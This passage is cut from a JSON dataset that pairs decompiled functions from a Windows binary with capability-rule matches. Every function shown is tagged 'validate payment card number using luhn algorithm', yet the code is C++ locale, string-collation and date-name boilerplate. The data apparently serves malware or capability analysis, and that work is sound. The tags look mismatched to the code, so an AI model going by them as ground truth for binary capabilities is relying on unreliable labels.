      *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = \" \\\\\\b@\\x01\";\n        }\n        else if (arg2 == *0x140110090) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401103e0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116960;\n        }\n        else if (arg2 == *0x14010ffd0) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x80);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140110620;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110340;\n            *(piVar5 + 0x22) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x7a) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400a6740(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116ca0;\n            fcn.140088c90(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x14010ffc0) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x80);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140110610;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110330;\n            *(piVar5 + 0x22) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x7a) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400a6370(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116bc0;\n            fcn.1400886e0(0, arg1, piVar5);\n        }\n        else {\n            if (arg2 != *0x140110010) {\n                arg1_01 = fcn.1400bd270(\"cannot create shim for unknown locale::facet\");\n                fcn.1400a5790(arg2);\n                do {\n                    fcn.1400bc6c0(arg2);\n                    arg1_01 = fcn.140014f30(arg1_01);\n                } while( true );\n            }\n            arg1_00 = fcn.1400bc710(0x28);\n            fcn.1400b1000(arg1_00, 0);\n            piVar1 = *0x14010fc90;\n            arg1_00[4] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116530;\n        }\n    }\n    else {\n        arg1_00 = *puVar3;\n    }\n    return arg1_00;\n}\n",
        "token_count": 4542
    },
    "14002f7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14002f7b0(int64_t *arg1, ulong noname_1, uint64_t arg3)\n\n{\n    if (arg3 < arg1[1]) {\n        do {\n            if (*(*arg1 + arg3) != noname_1) {\n                return arg3;\n            }\n            arg3 = arg3 + 1;\n        } while (arg3 != arg1[1]);\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 104
    },
    "140030ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.140030ff0(ulong noname_0, ulong s1, ulong s2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_strcoll(s1, s2);\n    return iVar1 >> 0x1e | iVar1 != 0;\n}\n",
        "token_count": 70
    },
    "1400313e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.1400313e0(ulong noname_0, ulong s1, ulong s2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_wcscoll(s1, s2);\n    return iVar1 >> 0x1e | iVar1 != 0;\n}\n",
        "token_count": 72
    },
    "1400460a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.1400460a0(ulong noname_0, ulong s1, ulong s2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_strcoll(s1, s2);\n    return iVar1 >> 0x1e | iVar1 != 0;\n}\n",
        "token_count": 71
    },
    "1400464f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.1400464f0(ulong noname_0, ulong s1, ulong s2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_wcscoll(s1, s2);\n    return iVar1 >> 0x1e | iVar1 != 0;\n}\n",
        "token_count": 72
    },
    "14005fb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14005fb20(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint16_t in_R9W;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    int64_t in_stack_00000038;\n    int32_t *in_stack_00000040;\n    \n    if (in_stack_00000028 != 0) {\n        iVar3 = in_stack_00000028 - in_stack_00000038 >> 1;\n        iVar1 = fcn.1400b6270(in_stack_00000030, in_R9W, arg2, arg3);\n        iVar2 = 0;\n        iVar4 = *in_stack_00000040 - iVar3;\n        if (iVar4 != 0) {\n            sub.msvcrt.dll_memcpy(iVar1, in_stack_00000028, iVar4 * 2);\n            iVar2 = *in_stack_00000040 - iVar3;\n        }\n        *in_stack_00000040 = iVar2 + (iVar1 - in_stack_00000030 >> 1);\n        return;\n    }\n    iVar1 = fcn.1400b6270(in_stack_00000030, in_R9W, arg2, arg3);\n    *in_stack_00000040 = iVar1 - in_stack_00000030 >> 1;\n    return;\n}\n",
        "token_count": 333
    },
    "1400b48e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b48e0(int64_t arg1, int64_t arg2)\n\n{\n    fcn.1400b32c0(arg1);\n    fcn.1400b47a0(arg1, arg1 + 0xd0);\n    *(arg1 + 0xd8) = 0;\n    *(arg1 + 0xe0) = 0;\n    *(arg1 + 0x1c) = 0;\n    *(arg1 + 0xe8) = arg2;\n    *(arg1 + 0x20) = arg2 == 0;\n    return;\n}\n",
        "token_count": 136
    },
    "14007ebc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007ebc0(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    \n    puVar5 = *(arg1 + 0x10);\n    if (puVar5 == NULL) {\n        puVar5 = fcn.1400bc710(0x70);\n        *(puVar5 + 1) = 0;\n        *puVar5 = 0x140118850;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x21) = 0;\n        puVar5[5] = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        *(puVar5 + 0xb) = 0;\n        *(puVar5 + 0x5c) = 0;\n        *(puVar5 + 0x6f) = 0;\n        *(arg1 + 0x10) = puVar5;\n    }\n    *(puVar5 + 0x21) = 0x2e;\n    *(*(arg1 + 0x10) + 0x22) = 0x2c;\n    iVar2 = *(arg1 + 0x10);\n    *(iVar2 + 0x10) = 0x14010a810;\n    *(iVar2 + 0x28) = 0x14010a810;\n    *(iVar2 + 0x38) = 0x14010a810;\n    *(iVar2 + 0x48) = 0x14010a810;\n    puVar3 = *0x14010fde0;\n    *(iVar2 + 0x18) = 0;\n    uVar1 = *puVar3;\n    *(iVar2 + 0x30) = 0;\n    *(iVar2 + 0x40) = 0;\n    *(iVar2 + 0x50) = 0;\n    *(iVar2 + 0x58) = 0;\n    *(iVar2 + 0x5c) = uVar1;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = **0x14010fdf0;\n    iVar4 = 0;\n    do {\n        *(*(arg1 + 0x10) + 100 + iVar4) = *(iVar2 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0xb);\n    return;\n}\n",
        "token_count": 634
    },
    "14007ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007ef00(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140110420 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x1400a04a0) {\n            fcn.1400a04d0(arg1_00);\n            fcn.1400bc6c0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "14007ef9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007ef90(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    \n    puVar5 = *(arg1 + 0x10);\n    if (puVar5 == NULL) {\n        puVar5 = fcn.1400bc710(0x70);\n        *(puVar5 + 1) = 0;\n        *puVar5 = 0x140118870;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x21) = 0;\n        puVar5[5] = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        *(puVar5 + 0xb) = 0;\n        *(puVar5 + 0x5c) = 0;\n        *(puVar5 + 0x6f) = 0;\n        *(arg1 + 0x10) = puVar5;\n    }\n    *(puVar5 + 0x21) = 0x2e;\n    *(*(arg1 + 0x10) + 0x22) = 0x2c;\n    iVar2 = *(arg1 + 0x10);\n    *(iVar2 + 0x10) = 0x14010a810;\n    *(iVar2 + 0x28) = 0x14010a810;\n    *(iVar2 + 0x38) = 0x14010a810;\n    *(iVar2 + 0x48) = 0x14010a810;\n    puVar3 = *0x14010fde0;\n    *(iVar2 + 0x18) = 0;\n    uVar1 = *puVar3;\n    *(iVar2 + 0x30) = 0;\n    *(iVar2 + 0x40) = 0;\n    *(iVar2 + 0x50) = 0;\n    *(iVar2 + 0x58) = 0;\n    *(iVar2 + 0x5c) = uVar1;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = **0x14010fdf0;\n    iVar4 = 0;\n    do {\n        *(*(arg1 + 0x10) + 100 + iVar4) = *(iVar2 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0xb);\n    return;\n}\n",
        "token_count": 633
    },
    "14007f2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007f2d0(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140110430 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x1400a0cd0) {\n            fcn.1400a0d00(arg1_00);\n            fcn.1400bc6c0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "14007f36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007f360(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    \n    puVar6 = *(arg1 + 0x10);\n    if (puVar6 == NULL) {\n        puVar6 = fcn.1400bc710(0x80);\n        *(puVar6 + 1) = 0;\n        *puVar6 = 0x140118890;\n        puVar6[2] = 0;\n        puVar6[3] = 0;\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 0x22) = 0;\n        puVar6[5] = 0;\n        puVar6[6] = 0;\n        puVar6[7] = 0;\n        puVar6[8] = 0;\n        puVar6[9] = 0;\n        puVar6[10] = 0;\n        *(puVar6 + 0xb) = 0;\n        *(puVar6 + 0x5c) = 0;\n        *(puVar6 + 0x7a) = 0;\n        *(arg1 + 0x10) = puVar6;\n    }\n    uVar1 = *0x14010a814;\n    puVar6[3] = 0;\n    puVar6[2] = 0x14010a810;\n    *(puVar6 + 0x22) = uVar1;\n    puVar6[5] = 0x14010a812;\n    puVar6[7] = 0x14010a812;\n    puVar6[9] = 0x14010a812;\n    puVar4 = *0x14010fde0;\n    puVar6[6] = 0;\n    uVar1 = *puVar4;\n    puVar6[8] = 0;\n    puVar6[10] = 0;\n    *(puVar6 + 0x5c) = uVar1;\n    *(puVar6 + 0xb) = 0;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = *(arg1 + 0x10);\n    iVar3 = **0x14010fdf0;\n    iVar5 = 0;\n    do {\n        *(iVar2 + 100 + iVar5 * 2) = *(iVar3 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0xb);\n    return;\n}\n",
        "token_count": 600
    },
    "14007f6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007f6b0(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140110440 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x1400a14f0) {\n            fcn.1400a1520(arg1_00);\n            fcn.1400bc6c0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "14007f74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007f740(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    \n    puVar6 = *(arg1 + 0x10);\n    if (puVar6 == NULL) {\n        puVar6 = fcn.1400bc710(0x80);\n        *(puVar6 + 1) = 0;\n        *puVar6 = 0x1401188b0;\n        puVar6[2] = 0;\n        puVar6[3] = 0;\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 0x22) = 0;\n        puVar6[5] = 0;\n        puVar6[6] = 0;\n        puVar6[7] = 0;\n        puVar6[8] = 0;\n        puVar6[9] = 0;\n        puVar6[10] = 0;\n        *(puVar6 + 0xb) = 0;\n        *(puVar6 + 0x5c) = 0;\n        *(puVar6 + 0x7a) = 0;\n        *(arg1 + 0x10) = puVar6;\n    }\n    uVar1 = *0x14010a814;\n    puVar6[3] = 0;\n    puVar6[2] = 0x14010a810;\n    *(puVar6 + 0x22) = uVar1;\n    puVar6[5] = 0x14010a812;\n    puVar6[7] = 0x14010a812;\n    puVar6[9] = 0x14010a812;\n    puVar4 = *0x14010fde0;\n    puVar6[6] = 0;\n    uVar1 = *puVar4;\n    puVar6[8] = 0;\n    puVar6[10] = 0;\n    *(puVar6 + 0x5c) = uVar1;\n    *(puVar6 + 0xb) = 0;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = *(arg1 + 0x10);\n    iVar3 = **0x14010fdf0;\n    iVar5 = 0;\n    do {\n        *(iVar2 + 100 + iVar5 * 2) = *(iVar3 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0xb);\n    return;\n}\n",
        "token_count": 602
    },
    "14007fa9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007fa90(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140110450 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x1400a1d10) {\n            fcn.1400a1d40(arg1_00);\n            fcn.1400bc6c0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "14007fb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007fb20(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar auVar3 [16];\n    uchar auVar4 [16];\n    \n    piVar2 = *(arg1 + 0x10);\n    auVar4 = CONCAT88(0x14010e2f1, 0x14010e2f5);\n    auVar3 = CONCAT88(0x14010e2f1, 0x14010e33c);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.1400bc710(400);\n        iVar1 = *0x1401105d0;\n        *(piVar2 + 1) = 0;\n        *(piVar2 + 0x31) = 0;\n        *piVar2 = iVar1 + 0x10;\n        piVar2[0x30] = 0;\n        *(arg1 + 0x10) = piVar2;\n        *(piVar2 + 2) = 0x0;\n        *(piVar2 + 4) = 0x0;\n        *(piVar2 + 6) = 0x0;\n        *(piVar2 + 8) = 0x0;\n        *(piVar2 + 10) = 0x0;\n        *(piVar2 + 0xc) = 0x0;\n        *(piVar2 + 0xe) = 0x0;\n        *(piVar2 + 0x10) = 0x0;\n        *(piVar2 + 0x12) = 0x0;\n        *(piVar2 + 0x14) = 0x0;\n        *(piVar2 + 0x16) = 0x0;\n        *(piVar2 + 0x18) = 0x0;\n        *(piVar2 + 0x1a) = 0x0;\n        *(piVar2 + 0x1c) = 0x0;\n        *(piVar2 + 0x1e) = 0x0;\n        *(piVar2 + 0x20) = 0x0;\n        *(piVar2 + 0x22) = 0x0;\n        *(piVar2 + 0x24) = 0x0;\n        *(piVar2 + 0x26) = 0x0;\n        *(piVar2 + 0x28) = 0x0;\n        *(piVar2 + 0x2a) = 0x0;\n        *(piVar2 + 0x2c) = 0x0;\n        *(piVar2 + 0x2e) = 0x0;\n    }\n    *(piVar2 + 0x28) = auVar3;\n    *(piVar2 + 0x1c) = auVar4;\n    piVar2[2] = \"%m/%d/%y\";\n    piVar2[3] = \"%m/%d/%y\";\n    piVar2[4] = 0x14010e269;\n    piVar2[5] = 0x14010e269;\n    piVar2[6] = 0x14010e272;\n    piVar2[7] = 0x14010e272;\n    piVar2[8] = 0x14010e273;\n    piVar2[9] = 0x14010e276;\n    piVar2[10] = 0x14010e279;\n    piVar2[0xb] = 0x14010e285;\n    piVar2[0xc] = 0x14010e28c;\n    piVar2[0xd] = 0x14010e293;\n    piVar2[0xe] = 0x14010e29b;\n    piVar2[0xf] = 0x14010e2a5;\n    piVar2[0x10] = 0x14010e2ae;\n    piVar2[0x11] = 0x14010e2b5;\n    piVar2[0x12] = 0x14010e2be;\n    piVar2[0x13] = 0x14010e2c2;\n    piVar2[0x14] = 0x14010e2c6;\n    piVar2[0x15] = 0x14010e2ca;\n    piVar2[0x16] = 0x14010e2ce;\n    piVar2[0x17] = 0x14010e2d2;\n    piVar2[0x18] = 0x14010e2d6;\n    piVar2[0x19] = 0x14010e2da;\n    piVar2[0x1a] = 0x14010e2e2;\n    piVar2[0x1b] = 0x14010e2eb;\n    piVar2[0x1e] = 0x14010e2fb;\n    piVar2[0x1f] = 0x14010e300;\n    piVar2[0x20] = 0x14010e305;\n    piVar2[0x21] = 0x14010e30c;\n    piVar2[0x22] = 0x14010e316;\n    piVar2[0x23] = 0x14010e31e;\n    piVar2[0x24] = 0x14010e327;\n    piVar2[0x25] = 0x14010e330;\n    piVar2[0x30] = 0x14010e358;\n    piVar2[0x26] = 0x14010e334;\n    piVar2[0x27] = 0x14010e338;\n    piVar2[0x2a] = 0x14010e340;\n    piVar2[0x2b] = 0x14010e344;\n    piVar2[0x2c] = 0x14010e348;\n    piVar2[0x2d] = 0x14010e34c;\n    piVar2[0x2e] = 0x14010e350;\n    piVar2[0x2f] = 0x14010e354;\n    return;\n}\n",
        "token_count": 1433
    },
    "14007ff2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007ff20(ulong *arg1, ulong arg2, int64_t arg3)\n\n{\n    ulong uVar1;\n    \n    arg1[2] = arg2;\n    *(arg1 + 1) = arg3 != 0;\n    *arg1 = 0x1401179f0;\n    uVar1 = fcn.1400a5670();\n    arg1[4] = uVar1;\n    fcn.14007fb20(arg1);\n    return;\n}\n",
        "token_count": 112
    },
    "14008038": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140080380(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar auVar3 [16];\n    uchar auVar4 [16];\n    \n    piVar2 = *(arg1 + 0x10);\n    auVar4 = CONCAT88(0x14010e47e, 0x14010e486);\n    auVar3 = CONCAT88(0x14010e47e, 0x14010e514);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.1400bc710(400);\n        iVar1 = *0x1401105e0;\n        *(piVar2 + 1) = 0;\n        *(piVar2 + 0x31) = 0;\n        *piVar2 = iVar1 + 0x10;\n        piVar2[0x30] = 0;\n        *(arg1 + 0x10) = piVar2;\n        *(piVar2 + 2) = 0x0;\n        *(piVar2 + 4) = 0x0;\n        *(piVar2 + 6) = 0x0;\n        *(piVar2 + 8) = 0x0;\n        *(piVar2 + 10) = 0x0;\n        *(piVar2 + 0xc) = 0x0;\n        *(piVar2 + 0xe) = 0x0;\n        *(piVar2 + 0x10) = 0x0;\n        *(piVar2 + 0x12) = 0x0;\n        *(piVar2 + 0x14) = 0x0;\n        *(piVar2 + 0x16) = 0x0;\n        *(piVar2 + 0x18) = 0x0;\n        *(piVar2 + 0x1a) = 0x0;\n        *(piVar2 + 0x1c) = 0x0;\n        *(piVar2 + 0x1e) = 0x0;\n        *(piVar2 + 0x20) = 0x0;\n        *(piVar2 + 0x22) = 0x0;\n        *(piVar2 + 0x24) = 0x0;\n        *(piVar2 + 0x26) = 0x0;\n        *(piVar2 + 0x28) = 0x0;\n        *(piVar2 + 0x2a) = 0x0;\n        *(piVar2 + 0x2c) = 0x0;\n        *(piVar2 + 0x2e) = 0x0;\n    }\n    *(piVar2 + 0x28) = auVar3;\n    *(piVar2 + 0x1c) = auVar4;\n    piVar2[2] = 0x14010e35c;\n    piVar2[3] = 0x14010e35c;\n    piVar2[4] = L\"%H:%M:%S\";\n    piVar2[5] = L\"%H:%M:%S\";\n    piVar2[6] = 0x14010e380;\n    piVar2[7] = 0x14010e380;\n    piVar2[8] = 0x14010e382;\n    piVar2[9] = 0x14010e388;\n    piVar2[10] = L\"%I:%M:%S %p\";\n    piVar2[0xb] = L\"Sunday\";\n    piVar2[0xc] = L\"Monday\";\n    piVar2[0xd] = L\"Tuesday\";\n    piVar2[0xe] = L\"Wednesday\";\n    piVar2[0xf] = L\"Thursday\";\n    piVar2[0x10] = L\"Friday\";\n    piVar2[0x11] = L\"Saturday\";\n    piVar2[0x12] = 0x14010e418;\n    piVar2[0x13] = 0x14010e420;\n    piVar2[0x14] = 0x14010e428;\n    piVar2[0x15] = 0x14010e430;\n    piVar2[0x16] = 0x14010e438;\n    piVar2[0x17] = 0x14010e440;\n    piVar2[0x18] = 0x14010e448;\n    piVar2[0x19] = L\"January\";\n    piVar2[0x1a] = L\"February\";\n    piVar2[0x1b] = L\"March\";\n    piVar2[0x1e] = L\"June\";\n    piVar2[0x1f] = L\"July\";\n    piVar2[0x20] = L\"August\";\n    piVar2[0x21] = L\"September\";\n    piVar2[0x22] = L\"October\";\n    piVar2[0x23] = L\"November\";\n    piVar2[0x24] = L\"December\";\n    piVar2[0x25] = 0x14010e4fc;\n    piVar2[0x30] = 0x14010e54c;\n    piVar2[0x26] = 0x14010e504;\n    piVar2[0x27] = 0x14010e50c;\n    piVar2[0x2a] = 0x14010e51c;\n    piVar2[0x2b] = 0x14010e524;\n    piVar2[0x2c] = 0x14010e52c;\n    piVar2[0x2d] = 0x14010e534;\n    piVar2[0x2e] = 0x14010e53c;\n    piVar2[0x2f] = 0x14010e544;\n    return;\n}\n",
        "token_count": 1345
    },
    "14008078": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140080780(ulong *arg1, ulong arg2, int64_t arg3)\n\n{\n    ulong uVar1;\n    \n    arg1[2] = arg2;\n    *(arg1 + 1) = arg3 != 0;\n    *arg1 = 0x140117a10;\n    uVar1 = fcn.1400a5670();\n    arg1[4] = uVar1;\n    fcn.140080380(arg1);\n    return;\n}\n",
        "token_count": 109
    },
    "140080be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140080be0(ulong arg1)\n\n{\n    char cVar1;\n    ulong s;\n    \n    cVar1 = fcn.1400b7b40();\n    if (cVar1 == '\\0') {\n        sub.msvcrt.dll_strlen(arg1);\n    }\n    else {\n        fcn.1400203b0(arg1);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "140080c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140080c80(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110460 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    return;\n}\n",
        "token_count": 121
    },
    "140080f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140080f00(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110510 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140110470 + 0x10;\n    return;\n}\n",
        "token_count": 138
    },
    "1400811c": {
        "rules": [
